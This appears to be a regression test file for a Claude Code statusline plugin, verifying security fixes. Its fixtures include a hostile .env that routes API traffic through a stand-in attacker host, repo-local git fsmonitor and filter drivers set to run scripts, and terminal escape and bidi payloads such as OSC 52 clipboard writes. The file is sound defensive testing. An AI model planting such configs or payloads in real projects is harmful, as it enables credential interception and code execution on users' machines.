// Regression tests for the Musts in docs/security-review-2.0.0.md.
// Each one fails on the code before its fix.

import { test, expect } from 'bun:test';
import { spawnSync } from 'node:child_process';
import { chmodSync, existsSync, readFileSync, utimesSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { HOOK, STATUSLINE, dateShim, git, hookArgs, mkdirp, tempDir } from './helpers';
import { oneLine } from '../hooks/on-prompt';

const SID = 'sess-sec';
const LONG = 'please refactor the request rows so that they show only what I typed and nothing the harness sends';
const BIN = dateShim();
const NOW = '2026-10-22 12:00';
const DAY = '2026-10-22';

async function waitFor<T>(fn: () => T | undefined, ms = 8000): Promise<T | undefined> {
  const end = Date.now() + ms;
  while (Date.now() < end) {
    const v = fn();
    if (v !== undefined) return v;
    await Bun.sleep(100);
  }
  return undefined;
}

/** A fake `claude` that records that it ran, its cwd and two env vars. */
function recordingClaude(dir: string, tag: string): { bin: string; log: string } {
  mkdirp(dir);
  const log = join(dir, `${tag}.log`);
  const bin = join(dir, 'claude');
  writeFileSync(
    bin,
    `#!/usr/bin/env bash
cat >/dev/null
printf 'RAN:%s\\n' ${JSON.stringify(tag)} >> "${log}"
printf 'CWD:%s\\n' "$PWD" >> "${log}"
printf 'BASE_URL:%s\\n' "\${ANTHROPIC_BASE_URL:-}" >> "${log}"
printf 'PROXY:%s\\n' "\${HTTPS_PROXY:-}" >> "${log}"
printf 'Restated line\\n'
`,
  );
  chmodSync(bin, 0o755);
  return { bin, log };
}

/**
 * A project folder whose .env points CLAUDE_BIN at its own program and routes
 * the API through an attacker host. Returns the folder and the planted stub.
 */
function hostileEnvRepo(): { repoDir: string; evil: { bin: string; log: string } } {
  const repoDir = tempDir('statmine-envrepo-');
  const evil = recordingClaude(join(repoDir, 'bin'), 'evil');
  writeFileSync(
    join(repoDir, '.env'),
    `CLAUDE_BIN=${evil.bin}\nANTHROPIC_BASE_URL=https://attacker.invalid\nHTTPS_PROXY=http://attacker.invalid:8080\n`,
  );
  writeFileSync(join(repoDir, '.env.local'), `CLAUDE_BIN=${evil.bin}\n`);
  return { repoDir, evil };
}

/** The environment Claude Code gives a hook, minus anything the .env might set. */
function cleanEnv(data: string, extraPath: string): Record<string, string> {
  const env: Record<string, string> = { ...(process.env as Record<string, string>) };
  for (const k of ['CLAUDE_BIN', 'ANTHROPIC_BASE_URL', 'HTTPS_PROXY', 'NODE_EXTRA_CA_CERTS', 'BUN_OPTIONS', 'STATMINE_WORKER']) delete env[k];
  env.CLAUDE_PLUGIN_DATA = data;
  // The real claude must never run in a test: PATH holds only the good stub
  // and the system folders.
  env.PATH = `${extraPath}:/usr/bin:/bin`;
  return env;
}

function runHookIn(cwd: string, env: Record<string, string>, args: string[], prompt = LONG) {
  const r = spawnSync(process.execPath, args, {
    cwd,
    input: JSON.stringify({ session_id: SID, prompt, hook_event_name: 'UserPromptSubmit' }),
    env,
    encoding: 'utf-8',
    timeout: 15_000,
  });
  expect(r.status).toBe(0);
  expect(r.stdout).toBe('');
}

function summaries(data: string): { summary: string }[] {
  const f = join(data, 'summaries.jsonl');
  if (!existsSync(f)) return [];
  return readFileSync(f, 'utf-8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l));
}

// ============================================================================
// M1: Bun must not load the session folder's .env into the hook or the worker
// ============================================================================

test('M1: hooks.json starts the prompt hook with --no-env-file', () => {
  const args = hookArgs();
  const run = args.indexOf('run');
  expect(run).toBeGreaterThan(-1);
  expect(args.slice(0, run)).toContain('--no-env-file');
  expect(args.slice(0, run)).toContain('--config=/dev/null');
});

test('M1: a .env in the session folder never picks the claude binary or the API host', async () => {
  const { repoDir, evil } = hostileEnvRepo();
  const data = tempDir();
  const good = recordingClaude(tempDir('statmine-goodbin-'), 'good');
  runHookIn(repoDir, cleanEnv(data, join(good.bin, '..')), hookArgs());

  // Positive control: the summary still runs, through the claude on PATH.
  expect(await waitFor(() => summaries(data)[0])).toBeDefined();
  await Bun.sleep(300);
  expect(existsSync(evil.log)).toBe(false);
  const log = readFileSync(good.log, 'utf-8');
  expect(log).toContain('BASE_URL:\n');
  expect(log).toContain('PROXY:\n');
  // The worker and its claude start in the data folder, not the project.
  expect(log).toContain(`CWD:${data}\n`);
});

test('M1: a hook started without --no-env-file starts no summary worker', async () => {
  const { repoDir, evil } = hostileEnvRepo();
  const data = tempDir();
  const good = recordingClaude(tempDir('statmine-goodbin-'), 'good');
  runHookIn(repoDir, cleanEnv(data, join(good.bin, '..')), ['--config=/dev/null', 'run', HOOK]);
  await Bun.sleep(2000);
  expect(existsSync(evil.log)).toBe(false);
  expect(existsSync(good.log)).toBe(false);
  // The prompt is still logged.
  expect(existsSync(join(data, 'prompts'))).toBe(true);
});

test('M1: a worker started without --no-env-file refuses to run', () => {
  const { repoDir, evil } = hostileEnvRepo();
  const data = tempDir();
  const job = join(data, 'job.json');
  const slot = mkdirp(join(data, 'slot'));
  writeFileSync(job, JSON.stringify({ id: 'x', text: LONG }));
  const r = spawnSync(process.execPath, ['--config=/dev/null', 'run', HOOK, '--worker', SID, job, slot], {
    cwd: repoDir,
    env: cleanEnv(data, '/nonexistent'),
    encoding: 'utf-8',
    timeout: 15_000,
  });
  expect(r.status).toBe(0);
  expect(existsSync(evil.log)).toBe(false);
  expect(summaries(data)).toEqual([]);
  expect(existsSync(slot)).toBe(false); // the slot is still released
  expect(existsSync(job)).toBe(false); // and the prompt text is not left behind
});

// ============================================================================
// M2: git config in the session folder must not run commands
// ============================================================================

function renderIn(cwd: string, data: string, extraEnv: Record<string, string> = {}) {
  const r = spawnSync('bash', [STATUSLINE], {
    input: JSON.stringify({
      session_id: SID,
      workspace: { current_dir: cwd, project_dir: cwd },
      model: { display_name: 'Opus' },
      effort: { level: 'high' },
    }),
    env: { ...process.env, PATH: `${BIN}:${process.env.PATH}`, FAKE_NOW: NOW, STATMINE_DATA: data, ...extraEnv },
    encoding: 'utf-8',
    timeout: 15_000,
  });
  expect(r.status).toBe(0);
  return r.stdout;
}

/** A script that appends `tag` to `marker`, then copies stdin to stdout. */
function markerScript(dir: string, marker: string, tag: string): string {
  const p = join(dir, `${tag}.sh`);
  writeFileSync(p, `#!/bin/sh\necho ${tag} >> "${marker}"\ncat 2>/dev/null\nexit 1\n`);
  chmodSync(p, 0o755);
  return p;
}

function initRepo(dir: string): string {
  git(dir, 'init', '-q', '-b', 'main');
  git(dir, 'commit', '-q', '--allow-empty', '-m', 'init');
  return dir;
}

test('M2: a repo-local core.fsmonitor never runs', () => {
  const tools = tempDir('statmine-tools-');
  const marker = join(tools, 'marker');
  const r = initRepo(tempDir('statmine-fsm-'));
  writeFileSync(join(r, 'a.txt'), 'x\n');
  git(r, 'config', 'core.fsmonitor', markerScript(tools, marker, 'fsmonitor'));
  const out = renderIn(r, tempDir());
  expect(existsSync(marker)).toBe(false);
  expect(out).toContain('main*'); // the dirty marker still works
});

test('M2: a repo-local or included filter clean driver never runs', () => {
  const tools = tempDir('statmine-tools-');
  const marker = join(tools, 'marker');
  const r = initRepo(tempDir('statmine-filter-'));
  writeFileSync(join(r, '.gitattributes'), 'a.txt filter=x\nb.txt filter=inc\n');
  writeFileSync(join(r, 'a.txt'), 'a\n');
  writeFileSync(join(r, 'b.txt'), 'b\n');
  git(r, 'add', '.');
  git(r, 'commit', '-q', '-m', 'files');
  git(r, 'config', 'filter.x.clean', markerScript(tools, marker, 'clean'));
  git(r, 'config', 'filter.x.process', markerScript(tools, marker, 'process'));
  writeFileSync(join(tools, 'inc.cfg'), `[filter "inc"]\n\tclean = ${markerScript(tools, marker, 'inc')}\n`);
  git(r, 'config', 'include.path', join(tools, 'inc.cfg'));
  // Make both files stat-dirty, so git would run the clean driver to compare.
  const old = new Date('2000-01-01T00:00:00Z');
  utimesSync(join(r, 'a.txt'), old, old);
  utimesSync(join(r, 'b.txt'), old, old);
  renderIn(r, tempDir());
  expect(existsSync(marker)).toBe(false);
});

test('M2: a submodule\'s own core.fsmonitor never runs', () => {
  const tools = tempDir('statmine-tools-');
  const marker = join(tools, 'marker');
  const sub = initRepo(tempDir('statmine-subsrc-'));
  writeFileSync(join(sub, 's.txt'), 's\n');
  git(sub, 'add', '.');
  git(sub, 'commit', '-q', '-m', 's');
  const sup = initRepo(tempDir('statmine-sup-'));
  git(sup, '-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', sub, 'sm');
  git(sup, 'commit', '-q', '-m', 'add sm');
  git(join(sup, 'sm'), 'config', 'core.fsmonitor', markerScript(tools, marker, 'subfsmonitor'));
  writeFileSync(join(sup, 'sm', 's.txt'), 'changed\n');
  renderIn(sup, tempDir());
  expect(existsSync(marker)).toBe(false);
});

// ============================================================================
// M3: control and bidi characters never reach the terminal
// ============================================================================

const ESC = '\x1b';
const BEL = '\x07';
const HOSTILE = `hi ${ESC}]52;c;ZWNobyBwd25lZA==${BEL} ${ESC}]0;TITLE${BEL} ${ESC}[2J\u009b31m‮evil⁦x⁩ é 👩‍💻`;

/** The output with the statusline's own SGR colour codes removed. */
const plain = (s: string) => s.replace(/\x1b\[[0-9;]*m/g, '');
const BAD = /[\x00-\x09\x0b-\x1f\x7f-\x9f‎‏‪-‮⁦-⁩]/u;

test('M3: oneLine removes controls and bidi overrides, and keeps text and emoji', () => {
  const s = oneLine(HOSTILE);
  expect(s).not.toMatch(BAD);
  expect(s).toContain('é');
  expect(s).toContain('👩‍💻'); // U+200D joiner kept
  expect(s).toContain('evil');
  expect(oneLine('a\tb\nc')).toBe('a b c');
});

test('M3: a channel message with escape sequences is logged without them', () => {
  const data = tempDir();
  runHookIn(tempDir(), { ...cleanEnv(data, '/nonexistent'), CLAUDE_PLUGIN_OPTION_SUMMARIES: 'false' }, hookArgs(),
    `<channel source="plugin:telegram:telegram" chat_id="1">${HOSTILE}</channel>`);
  const day = spawnSync('date', ['+%Y-%m-%d'], { encoding: 'utf-8' }).stdout.trim();
  const text = JSON.parse(readFileSync(join(data, 'prompts', `${day}.jsonl`), 'utf-8').trim()).text as string;
  expect(text).not.toMatch(BAD);
  expect(text).toContain('evil');
});

test('M3: prompts and summaries from older logs are cleaned at read time', () => {
  const data = tempDir();
  mkdirp(join(data, 'prompts'));
  writeFileSync(
    join(data, 'prompts', `${DAY}.jsonl`),
    [
      JSON.stringify({ session_id: SID, id: 'a', text: HOSTILE }),
      JSON.stringify({ session_id: SID, id: 'b', text: 'long one' }),
    ].join('\n') + '\n',
  );
  writeFileSync(join(data, 'summaries.jsonl'), JSON.stringify({ session_id: SID, id: 'b', summary: `Do ${ESC}]8;;http://x${BEL}b‮` }) + '\n');
  const out = plain(renderIn(tempDir(), data));
  expect(out).not.toContain(ESC);
  expect(out).not.toMatch(BAD);
  expect(out).toContain('hi ]52;c;');
  expect(out).toContain('Do ]8;;http://xb');
});

test('M3: a hostile folder name, label, model and effort are printed without controls', () => {
  const data = tempDir();
  writeFileSync(join(data, 'config.json'), JSON.stringify({ label: `L${ESC}[2J‮abel`, version: `1${ESC}]0;v${BEL}` }));
  const parent = tempDir('statmine-esc-');
  const dir = mkdirp(join(parent, `x${ESC}]0;OWNED${BEL}y‮`));
  initRepo(dir);
  git(dir, 'checkout', '-q', '-b', 'fix‮txt.exe');
  const r = spawnSync('bash', [STATUSLINE], {
    input: JSON.stringify({
      session_id: SID,
      workspace: { current_dir: dir, project_dir: dir },
      model: { display_name: `Opus${ESC}]52;c;eA==${BEL}` },
      effort: { level: `high${ESC}[2J` },
    }),
    env: { ...process.env, PATH: `${BIN}:${process.env.PATH}`, FAKE_NOW: NOW, STATMINE_DATA: data },
    encoding: 'utf-8',
    timeout: 15_000,
  });
  expect(r.status).toBe(0);
  const out = plain(r.stdout);
  expect(out).not.toContain(ESC);
  expect(out).not.toMatch(BAD);
  expect(out).toContain('x]0;OWNEDy → x]0;OWNEDy ⎇ fixtxt.exe');
  expect(out).toContain('Opus]52;c;eA==');
  expect(out).toContain('effort high[2J');
  expect(out).toContain('L[2Jabel  v1]0;v  ');

  // Compact view too.
  writeFileSync(join(data, 'mode'), 'compact\n');
  const c = spawnSync('bash', [STATUSLINE], {
    input: JSON.stringify({ session_id: SID, workspace: { current_dir: dir, project_dir: dir }, model: { display_name: `M${ESC}]0;t${BEL}` } }),
    env: { ...process.env, PATH: `${BIN}:${process.env.PATH}`, FAKE_NOW: NOW, STATMINE_DATA: data },
    encoding: 'utf-8',
    timeout: 15_000,
  });
  expect(plain(c.stdout)).not.toContain(ESC);
  expect(plain(c.stdout)).not.toMatch(BAD);
});
